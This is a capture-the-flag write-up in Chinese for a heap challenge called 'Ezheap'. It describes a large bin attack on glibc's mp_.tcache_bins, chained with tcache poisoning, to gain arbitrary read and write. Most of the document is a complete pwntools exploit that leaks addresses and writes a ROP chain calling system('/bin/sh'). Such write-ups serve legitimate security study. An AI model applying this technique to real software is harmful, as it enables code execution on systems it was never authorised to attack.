# Ezheap

## 题目简述

Heap 题去掉了 IO 相关触发接口，核心利用是 large bin attack 打 `mp_.tcache_bins`，使大堆块进入 tcache，再通过 tcache poisoning 形成任意地址读写。

## 解题过程

去除了IO相关的触发接口,largebinsattack打mp.tachebins即可实现将大堆块放入tachebins

然后tachepoison实现aar/aaw

```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
io = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
def ch(idx):
    io.sendlineafter(b'>> ',str(idx))
def add(idx,size):
    ch(1)
    io.sendlineafter(b'idx : ',str(idx))
    io.sendlineafter(b'size : ',str(size))
def free(idx):
    ch(3)
    io.sendlineafter(b'idx : ',str(idx))
def edit(idx,content):
    ch(2)
    io.sendlineafter(b'idx : ',str(idx))
    io.sendafter(b'content : ',content)
def show(idx):
    ch(4)
    io.sendlineafter(b'idx : ',str(idx))
def bug():
    gdb.attach(io)
add(0,0x450)
add(1,0x450)
add(2,0x450)
add(3,0x450)
free(0)
free(2)
add(0,0x450)
add(2,0x450)
show(0)
base = u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00') - 0x203b20
success(hex(base))
io.recvuntil(b'\x00\x00')
heap = u64(io.recv(6)+b'\x00\x00') - 0xb50
success(hex(heap))
# --- chunk overlap ---
add(4,0x548)
add(5,0x4f8)
add(6,0x450)
userdata = heap+0x1410
pl1 = p64(userdata)*2
pl1 = pl1.ljust(0x540,b'\x00') + p64(0x550)
edit(4,pl1)
free(5)
# --- large bin attack --
add(7,0x528) #point 4
add(8,0x518)
add(9,0x518)
add(16,0x450)
#gdb.attach(io)
free(7)
add(10,0x538)
show(4)
leak = io.recvuntil(b'done',drop=True)
fd = u64(leak[0:8])
bk = u64(leak[8:16])
fd_size = u64(leak[16:24])
bk_size = u64(leak[24:32])
success(hex(fd))
success(hex(bk))
success(hex(fd_size))
success(hex(bk_size))
mp = base+0x203180
environ = base + libc.sym.environ
pl2 = p64(fd) + p64(bk) + p64(fd_size) + p64(mp-0x20+0x70-8)
edit(4,pl2)
free(9)
add(11,0x540)
add(12,0x450)
free(12)
pl3 = p64(base+0x203b20) + p64(heap+0xb50) + p64(environ-0x18)
edit(0,pl3)
add(13,0x450)
show(13)
stack = u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
success(hex(stack))
ret = stack-0x1d0+0x50-0x10
free(16)
key=heap>>12
pl4 = p64(base+0x203b20) + p64(heap+0xb50) + p64(ret-8)
edit(0,pl4)
sys = base+libc.sym.system
rdi = base +0x000000000010f78b
binsh = base + next(libc.search(b'/bin/sh\x00'))
pl5 =p64(rdi+1)*5+ p64(rdi) + p64(binsh) + p64(rdi+1) + p64(sys)
#bug()
add(14,0x450)
edit(14,pl5)
io.interactive()
```

## 方法总结

- 核心技巧：large bin attack 修改 malloc 全局参数，配合 tcache poisoning 做 AAR/AAW。
- 识别信号：常规 IO 利用面被移除但仍能操作大块堆时，检查 large bin attack 是否能影响 tcache 管理参数。
- 复用要点：先把堆块布局打到可控 overlapping/large bin 状态，再用 tcache 链表投毒完成最终写入。
